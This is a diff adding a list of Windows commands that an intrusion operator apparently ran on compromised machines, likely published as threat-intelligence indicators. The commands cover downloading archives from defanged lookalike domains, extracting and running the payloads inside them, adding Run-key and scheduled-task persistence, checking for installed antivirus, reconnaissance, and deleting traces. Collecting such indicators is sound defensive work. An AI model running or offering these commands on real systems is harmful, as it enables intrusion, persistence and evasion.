@@ -1,0 +1,116 @@
+arp -a
+copy a.tmp themes.ps1
+copy mid.txt file.ps1
+curl -I https://adobe-acrobat[.]in
+curl -I https://adobreader-upgrade[.]in
+curl -I https://bsn.halsoftsoftsite[.]com
+curl -I https://halsoftsoftsite[.]com
+curl -I https://listsoft-update[.]site/
+curl -L -o a.rar https://adobe-acrobat[.]in/a.rar
+curl -L -o a.rar https://adobereader-update[.]in/taskmgr.rar
+curl -L -o a9.rar https://govt-filesharing[.]site/a9.rar
+curl -L -o msedge.rar https://adobe-acrobat[.]in/msedge.rar
+curl -L -o msedge.rar https://adobereader-update[.]in/msedge.rar
+curl -L -o svchost.rar https://govt-filesharing[.]site/svchost.rar
+curl -L -o taskmgr.rar https://govt-filesharing[.]site/taskmgr.rar
+curl -L -o tmp.rar https://adobereader-upgrade[.]in/tmp.rar
+curl -L -o tmp.rar https://govt-filesharing[.]site/tmp.rar
+curl -L -o tmp2.rar https://adobereader-upgrade[.]in/tmp1.rar
+curl -L -o wchost.rar https://adobe-acrobat[.]in/wchost.rar
+curl ifconfig.me/ip
+del /f /q svchost.rar
+del /f /q taskmgr.rar
+del /f /q themes.ps1
+del /f /q themes.ps1 tmp1.rar edge.vbs
+del /f /q tmp1.rar
+del /f /q tmp1.rar edge.vbs
+dir
+dir /a:h
+download ONENOTE.rar
+download a.tmp
+download a5.rar
+download a9.rar
+download bdcam.rar
+download edge.vbs
+download file.rar
+download file.txt
+download mid.txt
+download msedge.rar
+download proc.vbs
+download process.vbs
+download svchost.rar
+download taskmgr.rar
+download taskmgrs.rar
+download themes.ps1
+download tmp.rar
+download tmp1.rar
+download tmp2.rar
+download windows.exe
+download winprocd.vbs
+hello
+ipconfig
+ipconfig /all
+mkdir ChromeUpdate
+mkdir Edgesoft
+mkdir MicrosoftEdge
+mkdir Mozilla
+mkdir WindowsEdge
+mkdir chromepath
+mkdir temp
+net user
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ChromeBrowserTaskProcess /t REG_SZ /d "C:\ProgramData\chromepath\winprocd.vbs" /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ChromeBrowserTaskProcess /t REG_SZ /d "C:\ProgramData\chromepath\wsappx.exe" /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ChromeBrowserTaskProcess /t REG_SZ /d "C:\Users\Public\Pictures\wsappx.exe" /f
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+run CLEANUP.exe
+run edge.vbs
+run msedge.exe
+run proc.vbs
+run process.vbs
+run socks.vbs
+run svchost.exe
+run taskmgr.exe
+run taskmgrs.exe
+run tmp.vbs
+run wchost.exe
+run winprocd.vbs
+run wsappx.exe
+schtasks /create /tn "WindowsHostProcess_Managersd" /sc minute /mo 180 /tr "C:\Users\hp\AppData\Local\Microsoft\Windows\taskmgr.exe"
+screenshot
+systeminfo
+tar -xvf ONENOTE.rar
+tar -xvf a5.rar
+tar -xvf a9.rar
+tar -xvf bdcam.rar
+tar -xvf file.rar
+tar -xvf msedge.rar
+tar -xvf sock.rar
+tar -xvf svchost.rar
+tar -xvf taskmgr.rar
+tar -xvf taskmgrs.rar
+tar -xvf tmp.rar
+tar -xvf tmp1.rar
+tar -xvf tmp2.rar
+tar -xvf wchost.rar
+taskkill /F /PID 10572
+taskkill /F /PID 12912
+taskkill /F /PID 1304
+taskkill /F /PID 14476
+taskkill /F /PID 17300
+taskkill /F /PID 1832
+taskkill /F /PID 20272
+taskkill /F /PID 2072
+taskkill /F /PID 2728
+taskkill /F /PID 3872
+taskkill /F /PID 7864
+tasklist
+tasklist | findstr CLEANUP
+tasklist | findstr CLEANUP.exe
+tasklist | findstr taskhosts
+tasklist | findstr wchost
+tasklist | findstr wscript
+type socks.vbs
+ver
+whoami
+wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get * /value
+wmic logicaldisk get name
